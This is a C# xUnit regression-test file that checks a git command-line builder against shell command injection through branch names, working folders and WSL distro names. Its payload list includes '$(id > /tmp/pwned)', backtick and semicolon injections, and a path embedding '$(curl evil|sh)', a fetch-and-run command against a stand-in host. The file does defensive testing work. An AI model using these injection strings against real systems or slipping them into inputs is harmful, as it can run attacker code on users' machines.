using System.Linq;
using CodeShellManager.Services;
using Xunit;

namespace CodeShellManager.Tests;

/// <summary>
/// Regression tests for the command-injection fix found in the v0.8.0 pre-release review.
///
/// Two defects, one root cause — git command lines were built by string interpolation:
///
///   $"-d {distro} -- git -C {cwd} {arguments}"          (WSL)
///   $"-C \"{workingDir}\" {arguments}"                   (local)
///
/// `wsl.exe … -- <tail>` runs the tail through the distro's DEFAULT LOGIN SHELL — the
/// codebase verifies this itself in ShellSession.BuildWslArgs, which is why that method uses
/// `-e`. So a `$(…)`, backtick, `;` or `|` in a branch name or working-folder path executed
/// inside the distro. Git ref names legally permit all of those, and branch names come from
/// the cloned repo, so opening a hostile repository and creating a worktree from its branch
/// was arbitrary code execution.
///
/// These tests assert the two properties that make that impossible: `-e` rather than `--`,
/// and every value surviving as exactly one argv element through the real Win32 tokenizer.
/// </summary>
public class GitServiceInjectionTests
{
    // Payloads that would execute, or split an argument, if they ever reached a shell or
    // were concatenated unquoted. All are legal git ref names or legal Linux directory names.
    public static TheoryData<string> HostilePayloads() => new()
    {
        "$(id > /tmp/pwned)",
        "`id`",
        "a;id",
        "a|id",
        "a&&id",
        "a b",                    // plain split
        "a\"b",                   // quote — this is what broke the local path
        @"a\b",
        @"trailing\\",            // backslash run before the closing quote
        "$IFS",
        "a\nb",
    };

    [Theory]
    [MemberData(nameof(HostilePayloads))]
    public void WslGitCommandLine_KeepsEachValueAsExactlyOneArgument(string payload)
    {
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu", "/home/alice/repo",
            new[] { "worktree", "add", "-b", payload, "/home/alice/wt" });

        string[] argv = Win32CommandLineTests.Split(cmd);

        // -d Ubuntu -e git -C /home/alice/repo worktree add -b <payload> /home/alice/wt
        Assert.Equal(
            new[] { "-d", "Ubuntu", "-e", "git", "-C", "/home/alice/repo",
                    "worktree", "add", "-b", payload, "/home/alice/wt" },
            argv);
    }

    [Theory]
    [MemberData(nameof(HostilePayloads))]
    public void LocalGitCommandLine_KeepsEachValueAsExactlyOneArgument(string payload)
    {
        string cmd = GitService.BuildLocalGitCommandLine(
            @"C:\repo", new[] { "worktree", "add", "-b", payload, @"C:\wt" });

        string[] argv = Win32CommandLineTests.Split(cmd);

        Assert.Equal(
            new[] { "-C", @"C:\repo", "worktree", "add", "-b", payload, @"C:\wt" },
            argv);
    }

    [Fact]
    public void WslGitCommandLine_UsesDashE_NotDashDash()
    {
        // The whole fix. `--` hands the tail to the distro's login shell; `-e` execs git
        // directly. If this ever regresses, every payload above becomes live again.
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu", "/repo", new[] { "status", "--porcelain" });

        string[] argv = Win32CommandLineTests.Split(cmd);

        Assert.Contains("-e", argv);
        Assert.DoesNotContain("--", argv);
        // -e must come immediately before the program it execs.
        Assert.Equal("git", argv[argv.ToList().IndexOf("-e") + 1]);
    }

    [Fact]
    public void WslGitCommandLine_HostileWorkingFolderStaysOneArgument()
    {
        // The unattended half: cwd comes from the session's working folder and is reached by
        // the git poll on a timer, with no user action at all. `proj$(…)` is a legal Linux
        // directory name and creatable over \\wsl$.
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu", "/home/alice/proj$(curl evil|sh)", new[] { "status", "--porcelain" });

        string[] argv = Win32CommandLineTests.Split(cmd);

        Assert.Equal("/home/alice/proj$(curl evil|sh)", argv[5]);
        Assert.Equal(new[] { "status", "--porcelain" }, argv[6..]);
    }

    [Fact]
    public void WslGitCommandLine_HostileDistroNameStaysOneArgument()
    {
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu 22.04$(id)", "/repo", new[] { "status" });

        Assert.Equal("Ubuntu 22.04$(id)", Win32CommandLineTests.Split(cmd)[1]);
    }

    [Fact]
    public void ForEachRefFormat_SurvivesAsOneArgument()
    {
        // Not just a security property: `--format=%(refname:short)` is a bash syntax error
        // once a login shell sees it, so ListBranchesAsync could never have worked under
        // WSL while the `--` form was in use.
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu", "/repo", new[] { "for-each-ref", "--format=%(refname:short)", "refs/heads" });

        string[] argv = Win32CommandLineTests.Split(cmd);
        Assert.Equal("--format=%(refname:short)", argv[7]);
    }

    [Fact]
    public void WslGitCommandLine_TranslatesUncArgumentsPerArgument()
    {
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu", "/repo",
            new[] { "worktree", "add", @"\\wsl$\Ubuntu\home\alice\my repo" });

        string[] argv = Win32CommandLineTests.Split(cmd);
        Assert.Equal("/home/alice/my repo", argv[^1]);
    }
}
